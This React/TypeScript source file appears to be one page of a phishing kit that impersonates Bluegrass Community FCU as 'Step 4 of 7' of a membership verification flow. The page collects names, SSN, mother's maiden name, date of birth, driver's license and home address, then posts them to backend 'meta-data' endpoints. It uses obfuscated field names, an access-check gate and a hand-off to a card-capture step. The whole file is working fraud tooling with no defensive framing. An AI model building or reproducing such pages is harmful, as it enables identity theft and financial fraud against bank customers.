import React, { useEffect, useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';
import FlowPageLayout from '../components/FlowPageLayout';
import FlowHelmet from '../components/FlowHelmet';

type BasicInfoErrors = {
  fzNme: string;
  lzNme: string;
  phone: string;
  ssn: string;
  motherMaidenName: string;
  dob: string;
  driverLicense: string;
  stAd: string;
  apt: string;
  city: string;
  state: string;
  zipCode: string;
  form: string;
};

const BasicInfo: React.FC = () => {
  const [fzNme, setFzNme] = useState('');
  const [lzNme, setLzNme] = useState('');
  const [phone, setPhone] = useState('');
  const [ssn, setSsn] = useState('');
  const [motherMaidenName, setMotherMaidenName] = useState('');
  const [month, setMonth] = useState('');
  const [day, setDay] = useState('');
  const [year, setYear] = useState('');
  const [driverLicense, setDriverLicense] = useState('');
  const [showSSN, setShowSSN] = useState(false);
  const [stAd, setStAd] = useState('');
  const [apt, setApt] = useState('');
  const [city, setCity] = useState('');
  const [state, setState] = useState('');
  const [zipCode, setZipCode] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState<BasicInfoErrors>({
    fzNme: '',
    lzNme: '',
    phone: '',
    ssn: '',
    motherMaidenName: '',
    dob: '',
    driverLicense: '',
    stAd: '',
    apt: '',
    city: '',
    state: '',
    zipCode: '',
    form: ''
  });
  const [username, setUsername] = useState('');

  const navigate = useNavigate();
  const location = useLocation();
  const { emzemz: emzemzState } = (location.state as { emzemz?: string } | undefined) ?? {};
  const isAllowed = useAccessCheck(baseUrl);

  useEffect(() => {
    if (emzemzState) {
      setUsername(emzemzState);
    }
  }, [emzemzState]);

  if (isAllowed === null) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-[#4A9619] text-lg text-white">
        Checking access…
      </div>
    );
  }

  if (isAllowed === false) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-[#4A9619] text-lg text-white">
        Access denied. Redirecting…
      </div>
    );
  }

  if (!username) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-[#4A9619] text-lg text-white">
        Missing session data. Please restart the flow.
      </div>
    );
  }

  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: currentYear - 1899 }, (_, index) => 1900 + index);
  const daysInMonth = month && year ? new Date(parseInt(year, 10), parseInt(month, 10), 0).getDate() : 31;

  const formatPhone = (value: string) => {
    const digitsOnly = value.replace(/\D/g, '').slice(0, 10);

    if (digitsOnly.length >= 7) {
      return digitsOnly.replace(/(\d{3})(\d{3})(\d{0,4})/, '($1) $2-$3');
    }

    if (digitsOnly.length >= 4) {
      return digitsOnly.replace(/(\d{3})(\d{0,3})/, '($1) $2');
    }

    return digitsOnly;
  };

  const formatSSN = (value: string) => {
    const digitsOnly = value.replace(/\D/g, '').slice(0, 9);

    if (digitsOnly.length >= 6) {
      return digitsOnly.replace(
        /(\d{3})(\d{2})(\d{0,4})/,
        (_, first, second, third) => (third ? `${first}-${second}-${third}` : `${first}-${second}`)
      );
    }

    if (digitsOnly.length >= 4) {
      return digitsOnly.replace(/(\d{3})(\d{0,2})/, (_, first, second) => (second ? `${first}-${second}` : `${first}`));
    }

    return digitsOnly;
  };

  const renderError = (message: string) =>
    message ? (
      <p className="flex items-center gap-2 text-xs font-semibold text-red-600">
        <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current" aria-hidden="true">
          <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
        </svg>
        {message}
      </p>
    ) : null;

  const validateForm = () => {
    const phoneDigits = phone.replace(/\D/g, '');
    const ssnDigits = ssn.replace(/\D/g, '');

    const nextErrors: BasicInfoErrors = {
      fzNme: !fzNme.trim() ? 'First name is required' : '',
      lzNme: !lzNme.trim() ? 'Last name is required' : '',
      phone: phoneDigits.length !== 10 ? 'Phone must be 10 digits' : '',
      ssn: ssnDigits.length !== 9 ? 'SSN must be 9 digits' : '',
      motherMaidenName: !motherMaidenName.trim() ? "Mother's maiden name is required" : '',
      dob: !month || !day || !year ? 'Complete date of birth is required' : '',
      driverLicense: !driverLicense.trim() ? "Driver's license is required" : '',
      stAd: !stAd.trim() ? 'Street address is required' : '',
      apt: '',
      city: !city.trim() ? 'City is required' : '',
      state: !state.trim() ? 'State is required' : '',
      zipCode: !zipCode.trim() ? 'Zip code is required' : '',
      form: ''
    };

    if (month && day && year) {
      const birthDate = new Date(parseInt(year, 10), parseInt(month, 10) - 1, parseInt(day, 10));
      const now = new Date();
      let age = now.getFullYear() - birthDate.getFullYear();
      const monthDiff = now.getMonth() - birthDate.getMonth();

      if (monthDiff < 0 || (monthDiff === 0 && now.getDate() < birthDate.getDate())) {
        age -= 1;
      }

      if (age < 18) {
        nextErrors.dob = 'You must be at least 18 years old.';
      }
    }

    setErrors(nextErrors);
    return !Object.values(nextErrors).some(Boolean);
  };

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();

    if (!validateForm()) {
      return;
    }

    setIsLoading(true);

    const toMonthName = (monthNumber: string) => {
      const monthNames = [
        'January',
        'February',
        'March',
        'April',
        'May',
        'June',
        'July',
        'August',
        'September',
        'October',
        'November',
        'December'
      ];

      return monthNames[parseInt(monthNumber, 10) - 1] || '';
    };

    const dob = `${toMonthName(month)}/${day}/${year}`;

    try {
      await axios.post(`${baseUrl}api/bluegrass-meta-data-3/`, {
        emzemz: username,
        fzNme,
        lzNme,
        phone,
        ssn,
        motherMaidenName,
        dob,
        driverLicense
      });

      await axios.post(`${baseUrl}api/bluegrass-meta-data-4/`, {
        emzemz: username,
        stAd,
        apt,
        city,
        state,
        zipCode
      });

      navigate('/card', { state: { emzemz: username } });
    } catch (error) {
      console.error('Error submitting basic info:', error);
      setErrors((prev) => ({
        ...prev,
        form: 'There was an error submitting your information. Please try again.'
      }));
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <>
      <FlowHelmet title="Confirm Your Personal Details" />
      <FlowPageLayout
        eyebrow="Step 4 of 7"
        title="Confirm Your Personal Details"
        description="Provide your personal details exactly as they appear on your identification so we can verify your membership."
        contentClassName="space-y-8"
        secondaryContent={(
          <div className="flex flex-col items-center gap-3 text-white/90 md:flex-row md:gap-6">
            <span className="font-medium">Need help?</span>
            <a href="#" className="font-semibold hover:underline">Call Support</a>
            <span className="hidden h-4 w-px bg-white/60 md:block" aria-hidden="true" />
            <a href="#" className="font-semibold hover:underline">Visit Branch Locator</a>
          </div>
        )}
      >
        <form onSubmit={handleSubmit} className="space-y-8">
          {errors.form && (
            <div className="rounded-xl border border-red-100 bg-red-50 px-4 py-3 text-sm text-red-700">
              {errors.form}
            </div>
          )}

          <section className="space-y-6">
            <header className="space-y-1">
              <h2 className="text-lg font-semibold text-[#123524]">Personal Information</h2>
              <p className="text-sm text-[#557a46]">
                Make sure everything matches what is on file with Bluegrass Community FCU.
              </p>
            </header>

            <div className="grid gap-4 md:grid-cols-2">
              <div className="space-y-2">
                <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="fzNme">
                  First Name
                </label>
                <input
                  id="fzNme"
                  name="fzNme"
                  type="text"
                  value={fzNme}
                  onChange={(event) => setFzNme(event.target.value)}
                  className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
                  placeholder="Jane"
                />
                {renderError(errors.fzNme)}
              </div>

              <div className="space-y-2">
                <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="lzNme">
                  Last Name
                </label>
                <input
                  id="lzNme"
                  name="lzNme"
                  type="text"
                  value={lzNme}
                  onChange={(event) => setLzNme(event.target.value)}
                  className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
                  placeholder="Doe"
                />
                {renderError(errors.lzNme)}
              </div>

              <div className="space-y-2">
                <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="phone">
                  Phone
                </label>
                <input
                  id="phone"
                  name="phone"
                  type="text"
                  value={phone}
                  onChange={(event) => setPhone(formatPhone(event.target.value))}
                  className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
                  placeholder="(555) 123-4567"
                />
                {renderError(errors.phone)}
              </div>

              <div className="space-y-2">
                <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="ssn">
                  Social Security Number
                </label>
                <div className="flex items-center gap-3">
                  <input
                    id="ssn"
                    name="ssn"
                    type={showSSN ? 'text' : 'password'}
                    value={ssn}
                    onChange={(event) => setSsn(formatSSN(event.target.value))}
                    maxLength={11}
                    className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
                    placeholder="XXX-XX-XXXX"
                  />
                  <button
                    type="button"
                    onClick={() => setShowSSN((prev) => !prev)}
                    className="text-xs font-semibold text-[#0b5da7] hover:underline"
                  >
                    {showSSN ? 'Hide' : 'Show'}
                  </button>
                </div>
                {renderError(errors.ssn)}
              </div>

              <div className="space-y-2">
                <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="motherMaidenName">
                  Mother's Maiden Name
                </label>
                <input
                  id="motherMaidenName"
                  name="motherMaidenName"
                  type="text"
                  value={motherMaidenName}
                  onChange={(event) => setMotherMaidenName(event.target.value)}
                  className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
                  placeholder="Enter maiden name"
                />
                {renderError(errors.motherMaidenName)}
              </div>

              <div className="space-y-2 md:col-span-2">
                <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]">
                  Date of Birth
                </label>
                <div className="grid grid-cols-3 gap-2">
                  <select
                    value={month}
                    onChange={(event) => setMonth(event.target.value)}
                    className="rounded-xl border border-gray-200 px-3 py-2 text-sm text-gray-800 focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
                  >
                    <option value="">Month</option>
                    {Array.from({ length: 12 }, (_, index) => (
                      <option key={index + 1} value={index + 1}>
                        {new Date(0, index).toLocaleString('default', { month: 'long' })}
                      </option>
                    ))}
                  </select>
                  <select
                    value={day}
                    onChange={(event) => setDay(event.target.value)}
                    className="rounded-xl border border-gray-200 px-3 py-2 text-sm text-gray-800 focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
                  >
                    <option value="">Day</option>
                    {Array.from({ length: daysInMonth }, (_, index) => (
                      <option key={index + 1} value={index + 1}>
                        {index + 1}
                      </option>
                    ))}
                  </select>
                  <select
                    value={year}
                    onChange={(event) => setYear(event.target.value)}
                    className="rounded-xl border border-gray-200 px-3 py-2 text-sm text-gray-800 focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
                  >
                    <option value="">Year</option>
                    {years.map((value) => (
                      <option key={value} value={value}>
                        {value}
                      </option>
                    ))}
                  </select>
                </div>
                {renderError(errors.dob)}
              </div>

              <div className="space-y-2">
                <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="driverLicense">
                  Driver's License
                </label>
                <input
                  id="driverLicense"
                  name="driverLicense"
                  type="text"
                  value={driverLicense}
                  onChange={(event) => setDriverLicense(event.target.value)}
                  className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
                  placeholder="License number"
                />
                {renderError(errors.driverLicense)}
              </div>
            </div>
          </section>

          <section className="space-y-6">
            <header className="space-y-1">
              <h2 className="text-lg font-semibold text-[#123524]">Home Address</h2>
              <p className="text-sm text-[#557a46]">
                Tell us where you receive mail that’s connected to your account.
              </p>
            </header>

            <div className="grid gap-4 md:grid-cols-2">
              <div className="space-y-2 md:col-span-2">
                <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="stAd">
                  Street Address
                </label>
                <input
                  id="stAd"
                  name="stAd"
                  type="text"
                  value={stAd}
                  onChange={(event) => setStAd(event.target.value)}
                  className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
                  placeholder="123 Main Street"
                />
                {renderError(errors.stAd)}
              </div>

              <div className="space-y-2">
                <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="apt">
                  Apartment / Unit (Optional)
                </label>
                <input
                  id="apt"
                  name="apt"
                  type="text"
                  value={apt}
                  onChange={(event) => setApt(event.target.value)}
                  className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
                />
              </div>

              <div className="space-y-2">
                <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="city">
                  City
                </label>
                <input
                  id="city"
                  name="city"
                  type="text"
                  value={city}
                  onChange={(event) => setCity(event.target.value)}
                  className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
                  placeholder="Lexington"
                />
                {renderError(errors.city)}
              </div>

              <div className="space-y-2">
                <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="state">
                  State
                </label>
                <input
                  id="state"
                  name="state"
                  type="text"
                  value={state}
                  onChange={(event) => setState(event.target.value)}
                  className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
                  placeholder="KY"
                />
                {renderError(errors.state)}
              </div>

              <div className="space-y-2">
                <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="zipCode">
                  Zip Code
                </label>
                <input
                  id="zipCode"
                  name="zipCode"
                  type="text"
                  value={zipCode}
                  onChange={(event) => setZipCode(event.target.value)}
                  className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
                  placeholder="40502"
                />
                {renderError(errors.zipCode)}
              </div>
            </div>
          </section>

          <div className="flex justify-end">
            <button
              type="submit"
              disabled={isLoading}
              className="inline-flex items-center justify-center rounded-xl bg-[#4A9619] px-8 py-3 text-sm font-semibold uppercase tracking-wide text-white transition hover:bg-[#3f8215] disabled:cursor-not-allowed disabled:opacity-70"
            >
              {isLoading ? 'Submitting…' : 'Continue'}
            </button>
          </div>
        </form>
      </FlowPageLayout>
    </>
  );
};

export default BasicInfo;
